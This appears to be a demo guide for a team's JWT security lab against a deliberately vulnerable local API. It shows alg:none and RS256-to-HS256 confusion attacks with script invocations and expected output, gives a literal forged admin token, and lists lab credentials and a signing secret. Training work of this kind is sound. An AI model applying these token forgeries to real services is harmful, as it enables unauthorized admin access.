# Demo Flow & Postman Testing Guide
## Person 3 — Demo + Security Hardening

---

## Prerequisites

```bash
# 1. Clone and enter the project
cd jwt-auth-bypass-toolkit

# 2. Generate RSA keys
cd vulnerable-api
pip install -r requirements.txt
python generate_keys.py

# 3. Start the API
python app.py
# OR via Docker:
# docker compose up --build
```

API will be running at: **http://localhost:5001**

---

## Step-by-Step Demo Flow

### STEP 0 — Verify the API is running

```bash
curl http://localhost:5001/
```

**Expected response:**
```json
{
  "service": "JWT Auth Bypass Lab",
  "endpoints": { ... }
}
```

---

### STEP 1 — Normal Login (get a legitimate token)

```bash
curl -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "password123", "alg": "HS256"}'
```

**Expected:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "role": "user",
  "username": "alice"
}
```

Save this token as `$TOKEN`.

---

### STEP 2 — Access Protected Profile

```bash
curl http://localhost:5001/profile \
  -H "Authorization: Bearer $TOKEN"
```

**Expected:**
```json
{
  "username": "alice",
  "role": "user"
}
```

---

### STEP 3 — Try to Access Admin (should fail)

```bash
curl http://localhost:5001/admin \
  -H "Authorization: Bearer $TOKEN"
```

**Expected (403 Forbidden):**
```json
{
  "error": "Admin access required",
  "your_role": "user"
}
```

---

### STEP 4 — ATTACK 1: alg:none Bypass

```bash
cd attacker-toolkit
pip install -r requirements.txt

python none_attack.py --target http://localhost:5001 \
                      --username alice \
                      --password password123
```

**Expected output:**
```
[+] Logged in! Role: user
[*] Forging alg=none admin token...
[+] 🚨 ATTACK SUCCESSFUL!
[+] FLAG: FLAG{jwt_bypass_success}
```

**What happened?**
- Got legitimate `user` token
- Stripped the signature, set `alg=none`, changed `role=admin`
- Server accepted it without verifying the signature

---

### STEP 5 — ATTACK 2: RS256 → HS256 Confusion

```bash
python alg_confusion.py --target http://localhost:5001
```

**Expected output:**
```
[*] Fetching public key from http://localhost:5001/public-key ...
[+] Public key obtained (451 bytes)
[*] Forging admin JWT (alg=HS256, secret=public_key)...
[+] 🚨 ATTACK SUCCESSFUL!
[+] FLAG: FLAG{jwt_bypass_success}
```

**What happened?**
- Fetched the RSA public key from the API
- Signed a forged JWT with HS256, using the public key as HMAC secret
- Server verified it using the same public key as HMAC secret → match!

---

### STEP 6 — Manual Claim Forging

```bash
# Decode any token
python forge_claims.py --action decode --token $TOKEN

# Forge admin token with alg:none
python forge_claims.py --action forge-none --token $TOKEN --set role=admin sub=hacker

# Forge with known secret
python forge_claims.py --action forge-hmac --token $TOKEN \
  --secret supersecretkey123 \
  --set role=admin sub=hacker

# Extend expiry by 48 hours
python forge_claims.py --action extend --token $TOKEN --hours 48
```

---

## Postman Collection

### Collection Variables

| Variable | Value |
|---|---|
| `base_url` | `http://localhost:5001` |
| `token` | *(set after login)* |

---

### Request 1 — GET / (Health Check)

```
GET {{base_url}}/
```

No auth required.

---

### Request 2 — POST /login (Normal User)

```
POST {{base_url}}/login
Content-Type: application/json

{
  "username": "alice",
  "password": "password123",
  "alg": "HS256"
}
```

**Tests (Postman script):**
```javascript
pm.test("Status 200", () => pm.response.to.have.status(200));
pm.test("Has token", () => {
    const body = pm.response.json();
    pm.expect(body.token).to.be.a("string");
    pm.collectionVariables.set("token", body.token);
});
```

---

### Request 3 — POST /login (RS256)

```
POST {{base_url}}/login
Content-Type: application/json

{
  "username": "alice",
  "password": "password123",
  "alg": "RS256"
}
```

---

### Request 4 — GET /profile (Authenticated)

```
GET {{base_url}}/profile
Authorization: Bearer {{token}}
```

---

### Request 5 — GET /admin (Unauthorized)

```
GET {{base_url}}/admin
Authorization: Bearer {{token}}
```

Expected: **403 Forbidden** (if token has role=user)

---

### Request 6 — GET /admin (alg:none Forged Token)

```
GET {{base_url}}/admin
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

*(Generate the token using `none_attack.py` or `forge_claims.py`)*

Expected: **200 OK** with `FLAG{jwt_bypass_success}`

---

### Request 7 — GET /public-key

```
GET {{base_url}}/public-key
```

Returns the RSA public key used in the confusion attack.

---

## Credential Reference

| Username | Password | Role |
|---|---|---|
| `alice` | `password123` | user |
| `bob` | `letmein` | user |
| `admin` | `adm1n$ecret` | admin |

---

## Expected Demo Timeline

| Time | Action |
|---|---|
| 0:00 | Intro — what are JWTs? |
| 1:00 | Show API structure |
| 2:00 | Normal login flow |
| 3:00 | alg:none attack — live demo |
| 5:00 | RS256→HS256 confusion — live demo |
| 7:00 | Claim forging tool walkthrough |
| 9:00 | Mitigation walkthrough |
| 11:00 | Q&A |
